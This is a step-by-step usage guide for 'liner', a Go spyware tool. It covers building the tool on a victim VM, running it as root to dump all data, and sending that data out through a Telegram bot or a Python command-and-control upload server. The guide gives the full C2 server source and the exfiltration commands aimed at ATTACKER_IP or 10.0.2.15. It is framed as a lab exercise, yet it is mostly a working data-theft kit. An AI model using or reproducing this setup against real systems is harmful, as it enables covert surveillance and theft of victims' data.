## Liner Usage Guide for Data Exfiltration

This guide provides step-by-step instructions for using the liner tool in a lab environment to perform data exfiltration via Telegram or a custom server. The setup assumes the host machine as the attacker and a VirtualBox virtual machine (VM) as the victim.

---

### Prerequisites

Host Machine (Attacker): Ubuntu/Debian with Python 3 installed.  
Virtual Machine (Victim): Ubuntu/Debian with Go 1.24.5 installed.  
Network: VirtualBox VM set to NAT (default, with attacker IP 10.0.2.15) or Host-Only (e.g., 192.168.56.101).  
Telegram (optional): A Telegram bot token and chat ID for Telegram-based exfiltration.

---

### Setup Instructions

1. Install Go 1.24.5 on the Victim VM

Remove any existing Go installations:
sudo apt remove --purge golang golang-* go
sudo rm -rf /usr/lib/go* /usr/bin/go /usr/local/go ~/.go ~/go

Install Go 1.24.5:
wget https://go.dev/dl/go1.24.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.5.linux-amd64.tar.gz

Update ~/.bashrc:
nano ~/.bashrc

Add these lines at the end:
export PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

Apply changes:
source ~/.bashrc

Verify Go installation:
go version

Expected output: go version go1.24.5 linux/amd64.

---

2. Build Liner on the Victim VM

Navigate to the project directory:
cd ~/Desktop/liner

Initialize and tidy Go modules:
rm -rf go.mod go.sum
go mod init liner
go mod tidy

Build the tool:
go build -v -mod=mod -o liner ./cmd
sudo mv liner /usr/bin
sudo chmod +x /usr/bin/liner

---

### Exfiltration Modes

#### Option 1: Exfiltration via Telegram

Setup Telegram Bot:
- Create a Telegram bot using BotFather.
- Get bot token and chat ID.

Run Liner with Telegram:
sudo liner --mode Spyware --dump all --telegram --token <BOT_TOKEN> --id <CHAT_ID> --encryption no

Example:
sudo liner --mode Spyware --dump all --telegram --token 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --id 123456789 --encryption no

Check your Telegram chat for received data.

---

#### Option 2: Exfiltration via Custom Server

Setup Python Server on Attacker (Host Machine):
```
mkdir ~/c2
cd ~/c2
```
Create c2_server.py:
```python
import http.server
import socketserver
import os

PORT = 8080
UPLOAD_DIR = "uploads"

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        if self.path == '/message':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Message received')
            with open(os.path.join(UPLOAD_DIR, f'part_{len(os.listdir(UPLOAD_DIR))}.txt'), 'w') as f:
                f.write(body)
        else:
            self.send_response(404)
            self.end_headers()

with socketserver.TCPServer(("", PORT), UploadHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
```

Run server:
```
python3 c2_server.py
```
Configure Network:
- NAT Mode (default): Test with curl
- Host-Only Mode: Switch VM, test connectivity

Allow port:
```
sudo ufw allow 8080
```
Run Liner with Server:
```
sudo liner --mode Spyware --dump all --server <ATTACKER_IP> --port 8080 --encryption no
```
Test Server Exfiltration:
```
ls ~/c2/uploads
cat part_* > liner_data.zip
unzip liner_data.zip
```
---

### Troubleshooting

Build Issues:
- Verify Go version: go version
- Rebuild if needed

Network Issues:
- Ensure server is running
- Test with curl
- Switch to Host-Only if NAT fails

Telegram Issues:
- Verify bot token & chat ID
- Ensure chat is active

Flag Errors:
- Use -- not - for flags

---

### Example Workflow

Attacker (Host):
```
cd ~/c2 && python3 c2_server.py
curl -X POST -d "message=test" http://127.0.0.1:8080/message
```
Victim (VM):
```
cd ~/Desktop/liner && go build -v -mod=mod -o liner ./cmd
sudo liner --mode Spyware --dump all --server 10.0.2.15 --port 8080 --encryption no
```
Verify:
```
ls ~/c2/uploads
cat part_* > liner_data.zip && unzip liner_data.zip
```
For Telegram:
```
sudo liner --mode Spyware --dump all --telegram --token <BOT_TOKEN> --id <CHAT_ID> --encryption no
```
Check Telegram chat for data.
